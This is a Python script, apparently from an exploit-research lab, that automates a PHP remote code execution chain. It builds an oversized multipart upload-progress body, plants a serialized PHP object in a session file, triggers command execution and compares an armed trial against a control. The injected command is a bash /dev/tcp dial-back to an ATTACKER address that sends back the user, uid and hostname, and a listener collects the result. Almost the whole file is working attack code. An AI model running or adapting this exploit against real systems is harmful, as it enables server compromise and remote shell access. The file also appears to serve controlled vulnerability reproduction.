#!/usr/bin/env python3
"""cve2 venue RCE trial: vendor-shape arm -> published-state gate -> app-gated
system(cmd) -> dial-back shell to ATTACKER. One armed trial + one no-arm
control. Attribution: control must print 'idle' and produce NO dial-back.

Flow per trial:
  restart venue -> rm markers -> seed payload -> [R1 arm POST -> expect 500
  -> touch armed marker] -> warm GET -> listener up -> RCE GET with cmd ->
  collect banner lines from ATTACKER-side listener.
"""
import os, socket, subprocess, sys, threading, time, urllib.parse

HOST = '192.168.51.170'
ATTACKER = '192.168.98.26'
SID = 'warmup00000000000000000000'
SEED = 'o|O:5:"Probe":1:{s:1:"p";s:4:"cmdl";}'
BOUND = '------cve2rce'

def ssh(cmd):
    return subprocess.run(['ssh', 'jacob@' + HOST, cmd],
                          capture_output=True, text=True)

def restart():
    ssh('. /etc/apache2/envvars && sudo -E /usr/sbin/apache2 -k restart >/dev/null 2>&1')
    time.sleep(2)

def arm_body(n=2500, fill=512):
    parts = ['--%s\r\nContent-Disposition: form-data; name="PHPSESSID"\r\n\r\narmsid0abcdef0123456789\r\n' % BOUND,
             '--%s\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nk\r\n' % BOUND]
    for i in range(n):
        nm = ('u%d' % i).ljust(fill, 'A')
        parts.append('--%s\r\nContent-Disposition: form-data; name="%s"; filename="f.txt"\r\n'
                     'Content-Type: text/plain\r\n\r\nxxxxxxxx\r\n' % (BOUND, nm))
    return ''.join(parts).encode() + b'--' + BOUND.encode() + b'--\r\n'

def ssh_in(cmd, stdin_data):
    return subprocess.run(['ssh', 'jacob@' + HOST, cmd], input=stdin_data,
                          capture_output=True, text=True)

def dialback_cmd(port):
    return ("/bin/bash -c 'exec 3<>/dev/tcp/%s/%d; echo \"$(id -un) uid=$(id -u) host=$(hostname) arch=$(uname -m)\" >&3; "
            "echo CVE2-DIALBACK-EOF >&3; exit'" % (ATTACKER, port))

def listener(port, box, timeout=25):
    ls = socket.socket(); ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    ls.bind(('0.0.0.0', port)); ls.listen(1); ls.settimeout(timeout)
    def run():
        try:
            conn, _ = ls.accept()
            conn.settimeout(timeout)
            data = b''
            while b'CVE2-DIALBACK-EOF' not in data:
                c = conn.recv(4096)
                if not c:
                    break
                data += c
            conn.close()
            box.append(data.decode('utf-8', 'replace'))
        except Exception as e:
            box.append('LISTENER:%s' % e)
        finally:
            ls.close()
    t = threading.Thread(target=run, daemon=True)
    t.start()
    return t

def trial(armed, port):
    restart()
    ssh('sudo rm -f /tmp/cve2_ran /tmp/cve2_armed /tmp/sess/sess_armsid*')
    ssh_in('sudo tee /tmp/sess/sess_%s >/dev/null; sudo chmod 666 /tmp/sess/sess_%s' % (SID, SID), SEED)
    if armed:
        code = ssh('curl -s -o /dev/null -w "%%{http_code}" --max-time 60 '
                   '-H "Content-Type: multipart/form-data; boundary=%s" '
                   '--data-binary @/tmp/arm.bin http://127.0.0.1:18990/cve2_app.php' % BOUND).stdout
        print('  R1 arm ->', code)
        if '500' in code:
            ssh('sudo touch /tmp/cve2_armed')
    warm = ssh('curl -s --max-time 10 "http://127.0.0.1:18990/cve2_app.php?PHPSESSID=%s"' % SID).stdout
    print('  warm GET:', warm.replace('\n', ' ')[:90])
    box = []
    t = listener(port, box)
    time.sleep(0.3)
    ssh_in('cat > /tmp/cmd.txt', dialback_cmd(port))
    r2 = ssh('curl -s -G --max-time 30 "http://127.0.0.1:18990/cve2_rce.php" '
             '--data-urlencode "PHPSESSID=%s" --data-urlencode "c@/tmp/cmd.txt"' % SID).stdout
    t.join(timeout=32)
    print('  R2-RCE body:', r2.replace('\n', ' | ')[:160])
    print('  dial-back  :', (box[0].replace('\n', ' | ') if box else 'NONE')[:160])
    marker = ssh('sudo ls /tmp/pwned 2>/dev/null; sudo cat /tmp/cve2_ran 2>/dev/null').stdout
    print('  markers    :', marker.replace('\n', ' ')[:80])

if __name__ == '__main__':
    with open('/tmp/arm.bin', 'wb') as f:
        f.write(arm_body())
    subprocess.run(['scp', '-q', '/tmp/arm.bin', 'jacob@%s:/tmp/arm.bin' % HOST], check=True)
    subprocess.run(['scp', '-q', os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                              'cve2_rce.php'), 'jacob@%s:/opt/uaf-exploit/' % HOST], check=True)
    only = sys.argv[1] if len(sys.argv) > 1 else 'both'
    if only in ('armed', 'both'):
        print('== ARMED trial (expect: gate fires, dial-back as www-data) ==')
        trial(armed=True, port=19998)
    if only in ('control', 'both'):
        print('== CONTROL trial (expect: idle, no dial-back) ==')
        trial(armed=False, port=19999)
